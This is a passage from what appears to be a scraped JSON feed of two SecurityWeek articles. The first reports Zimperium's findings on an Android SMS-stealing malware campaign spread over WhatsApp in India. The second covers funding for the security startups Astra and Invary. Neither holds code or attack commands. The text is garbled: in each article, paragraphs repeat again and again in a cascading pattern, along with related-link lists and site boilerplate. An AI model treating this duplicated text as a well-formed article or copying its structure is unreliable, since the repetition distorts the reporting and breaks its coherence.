publicly accessible Firebase storage buckets in which the threat actor has stored 2.5 gigabytes of information such as SMS messages from banks, card and banking details, and government ID data, and estimates that 50,000 users have been compromised.\n\n\n\nThe campaign relied on WhatsApp for the distribution of APK files posing as government or banking applications, but which installed malware instead, tricking users into disclosing their sensitive information.\n\n\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\n“Analysis of the collected samples reveals shared code structures, user interface elements, and app logos, suggesting a coordinated effort by a single threat actor targeting mobile devices running the Android OS,” Zimperium said in a research note.\n\n\n\nThe company said it found more than 220 publicly accessible Firebase storage buckets in which the threat actor has stored 2.5 gigabytes of information such as SMS messages from banks, card and banking details, and government ID data, and estimates that 50,000 users have been compromised.\n\n\n\nThe campaign relied on WhatsApp for the distribution of APK files posing as government or banking applications, but which installed malware instead, tricking users into disclosing their sensitive information.\n\n\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nThe company said it found more than 220 publicly accessible Firebase storage buckets in which the threat actor has stored 2.5 gigabytes of information such as SMS messages from banks, card and banking details, and government ID data, and estimates that 50,000 users have been compromised.\n\n\n\nThe campaign relied on WhatsApp for the distribution of APK files posing as government or banking applications, but which installed malware instead, tricking users into disclosing their sensitive information.\n\n\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nThe campaign relied on WhatsApp for the distribution of APK files posing as government or banking applications, but which installed malware instead, tricking users into disclosing their sensitive information.\n\n\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nIonut Arghire is an international correspondent for SecurityWeek.\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.\nDiscover strategies for vendor selection, integration to minimize redundancies, and maximizing ROI from your cybersecurity investments. Gain actionable insights to ensure your stack is ready for tomorrow’s challenges.\nDive into critical topics such as incident response, threat intelligence, and attack surface management. Learn how to align cyber resilience plans with business objectives to reduce potential impacts and secure your organization in an ever-evolving threat landscape.\nGigamon has promoted Tony Jarjoura to CFO and Ram Bhide has been hired as Senior VP of engineering.\nCloud security firm Mitiga has appointed Charlie Thomas as Chief Executive Officer.\nCynet announced the appointment of Jason Magee as Chief Executive Officer.\n\n\nThe blame of security incidents may be shared—but the burden of response always falls on the security team. Here’s how to prepare for the inevitable.\n(Joshua Goldfarb)\n\n\n\nWith each passing year, social engineering attacks are becoming bigger and bolder thanks to rapid advancements in artificial intelligence.\n(Stu Sjouwerman)\n\n\n\nWhat challenges will the new administration face and what might President Trump’s record on cybersecurity indicate about the likely approach in 2025 and beyond?\n(Marc Solomon)\n\n\n\nWith DORA’s January 2025 compliance deadline approaching, financial institutions must embrace rigorous testing, tailored threat profiles, and continuous vigilance to safeguard against cyber threats.\n(Trevin Edgeworth)\n\n\n\nWith a security-first culture fully in play, developers will view the protected deployment of AI as a marketable skill, and respond accordingly.\n(Matias Madou)\n\nFlipboard\nReddit\nWhatsapp\nWhatsapp\nEmail\nGot a confidential news tip? We want to hear from you.\nReach a large audience of enterprise cybersecurity professionals \nSubscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inbox.\nCopyright © 2025 SecurityWeek ®, a Wired Business Media Publication. All Rights Reserved. \n\r\n\t\t\t\t\tSubscribe to the SecurityWeek Email Briefing to stay informed on the latest cybersecurity\r\n\t\t\t\t\tnews, threats, and expert insights. Unsubscribe at any time.\r\n\t\t\t\t\t\n\n\n"
    },
    {
        "Title": "Astra, Invary Raise Millions for AI-Powered Pentesting, Runtime Security",
        "Link": "https://www.securityweek.com/astra-invary-raise-millions-for-ai-powered-pentesting-runtime-security/",
        "Summary": "<p>Astra Security and Invary have received new funding to fuel development of their vulnerability scanning and runtime security solutions.</p>\n<p>The post <a href=\"https://www.securityweek.com/astra-invary-raise-millions-for-ai-powered-pentesting-runtime-security/\">Astra, Invary Raise Millions for AI-Powered Pentesting, Runtime Security</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-02-06",
        "Content": "Hi, what are you looking for?\nAstra Security and Invary have received new funding to fuel development of their vulnerability scanning and runtime security solutions.\nBy\nFlipboard\nReddit\nWhatsapp\nWhatsapp\nEmail\nCybersecurity startups Astra Security and Invary this week announced fresh funding rounds that will help them advance their solutions for identifying vulnerabilities and ensuring confidential computing, respectively.\nAstra received $2.7 million in a growth capital round led by Emergent Ventures, with additional support from Better Capital, Blume Ventures, Neon Fund, and PointOne Capital.\n\n\n\nFounded in 2018, the privately held US and India-based cybersecurity firm built an AI-powered pentesting platform that mimics hacker behavior to identify vulnerabilities in applications.\n\n\n\nThe company says its scanning engine incorporates more than 10,000 security tests to hunt for over 13,000 vulnerabilities, and that the solution has been adopted by more than 800 customers.\n\n\n\nThe new funding will be used to accelerate product development and build functionality to hunt for security defects in cloud environments. Astra will also focus on the use of AI for security detections.\n\n\n\nInvary this week announced raising $3.5 million in seed funding from Flyover Capital, Hyperlink Ventures, KCRise Fund, and SineWave Ventures. The investment round brings the total raised by the company to $5.35 million, after a pre-seed funding round closed last year.\n\n\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nAstra received $2.7 million in a growth capital round led by Emergent Ventures, with additional support from Better Capital, Blume Ventures, Neon Fund, and PointOne Capital.\n\n\n\nFounded in 2018, the privately held US and India-based cybersecurity firm built an AI-powered pentesting platform that mimics hacker behavior to identify vulnerabilities in applications.\n\n\n\nThe company says its scanning engine incorporates more than 10,000 security tests to hunt for over 13,000 vulnerabilities, and that the solution has been adopted by more than 800 customers.\n\n\n\nThe new funding will be used to accelerate product development and build functionality to hunt for security defects in cloud environments. Astra will also focus on the use of AI for security detections.\n\n\n\nInvary this week announced raising $3.5 million in seed funding from Flyover Capital, Hyperlink Ventures, KCRise Fund, and SineWave Ventures. The investment round brings the total raised by the company to $5.35 million, after a pre-seed funding round closed last year.\n\n\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nFounded in 2018, the privately held US and India-based cybersecurity firm built an AI-powered pentesting platform that mimics hacker behavior to identify vulnerabilities in applications.\n\n\n\nThe company says its scanning engine incorporates more than 10,000 security tests to hunt for over 13,000 vulnerabilities, and that the solution has been adopted by more than 800 customers.\n\n\n\nThe new funding will be used to accelerate product development and build functionality to hunt for security defects in cloud environments. Astra will also focus on the use of AI for security detections.\n\n\n\nInvary this week announced raising $3.5 million in seed funding from Flyover Capital, Hyperlink Ventures, KCRise Fund, and SineWave Ventures. The investment round brings the total raised by the company to $5.35 million, after a pre-seed funding round closed last year.\n\n\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nThe company says its scanning engine incorporates more than 10,000 security tests to hunt for over 13,000 vulnerabilities, and that the solution has been adopted by more than 800 customers.\n\n\n\nThe new funding will be used to accelerate product development and build functionality to hunt for security defects in cloud environments. Astra will also focus on the use of AI for security detections.\n\n\n\nInvary this week announced raising $3.5 million in seed funding from Flyover Capital, Hyperlink Ventures, KCRise Fund, and SineWave Ventures. The investment round brings the total raised by the company to $5.35 million, after a pre-seed funding round closed last year.\n\n\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nThe new funding will be used to accelerate product development and build functionality to hunt for security defects in cloud environments. Astra will also focus on the use of AI for security detections.\n\n\n\nInvary this week announced raising $3.5 million in seed funding from Flyover Capital, Hyperlink Ventures, KCRise Fund, and SineWave Ventures. The investment round brings the total raised by the company to $5.35 million, after a pre-seed funding round closed last year.\n\n\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nInvary this week announced raising $3.5 million in seed funding from Flyover Capital, Hyperlink Ventures, KCRise Fund, and SineWave Ventures. The investment round brings the total raised by the company to $5.35 million, after a pre-seed funding round closed last year.\n\n\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nThe company’s solution, built using a grant from the National Security Agency, checks the runtime integrity of systems, to protect them against tampering, persistence, and hidden threats, enabling a zero trust architecture.\n\n\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nThe Lawrence, Kansas-based startup will use the new investment to accelerate the launch of runtime integrity verification products for Windows Kernel and eBPF, which will complement its existing Linux solution. Invary also supports the verification of Trusted Execution Environments (TEEs).Advertisement. Scroll to continue reading.\n\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nRelated: Riot Raises $30 Million for Employee Cybersecurity Solution\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nRelated: Eclypsium Eyes Global Expansion with $45 Million Series C Investment\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nRelated: Advancing Women in Cybersecurity – One CMO’s Journey\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nRelated: Cyolo Banks $60M Series B for ZTNA Technology\n\nIonut Arghire is an international correspondent for SecurityWeek.\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.\nDiscover strategies for vendor selection, integration to minimize redundancies, and maximizing ROI from your cybersecurity investments. Gain actionable insights to ensure your stack is ready for tomorrow’s challenges.\nDive into critical topics such as incident response, threat intelligence, and attack surface management. Learn how to align cyber resilience plans with business objectives to reduce potential impacts and secure your organization in an ever-evolving threat landscape.\nGigamon has promoted Tony Jarjoura to CFO and Ram Bhide has been hired as Senior VP of engineering.\nCloud security firm Mitiga has appointed Charlie Thomas as Chief Executive Officer.\nCynet announced the appointment of Jason Magee as Chief Executive Officer.\n\n\nThe blame of security incidents may be shared—but the burden of response always falls on the security team. Here’s how to prepare for the inevitable.\n(Joshua Goldfarb)\n\n\n\nWith each passing year, social engineering attacks are becoming bigger and bolder thanks to rapid advancements in artificial intelligence.\n(Stu Sjouwerman)\n\n\n\nWhat challenges will the new administration face and what might President Trump’s record on cybersecurity indicate about the likely approach in 2025 and beyond?\n(Marc Solomon)\n\n\n\nWith DORA’s January 2025 compliance deadline approaching, financial institutions must embrace rigorous testing, tailored threat profiles, and continuous vigilance to safeguard against cyber threats.\n(Trevin Edgeworth)\n\n\n\nWith a security-first culture fully in play, developers will view the protected deployment of AI as a marketable skill, and respond accordingly.\n(Matias Madou)\n\nFlipboard\nReddit\nWhatsapp\nWhatsapp\nEmail\nGot a confidential news tip? We want to hear from you.\nReach a large audience of enterprise cybersecurity professionals \nSubscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inbox.\nCopyright © 2025 SecurityWeek ®, a Wired Business Media Publication. All Rights Reserved. \n\r\n\t\t\t\t\tSubscribe to the SecurityWeek Email Briefing to stay informed on the latest cybersecurity\r\n\t\t\t\t\tnews, threats, and expert insights. Unsubscribe at any time.\r\n\t\t\t\t\t\n\n\n"
    }
]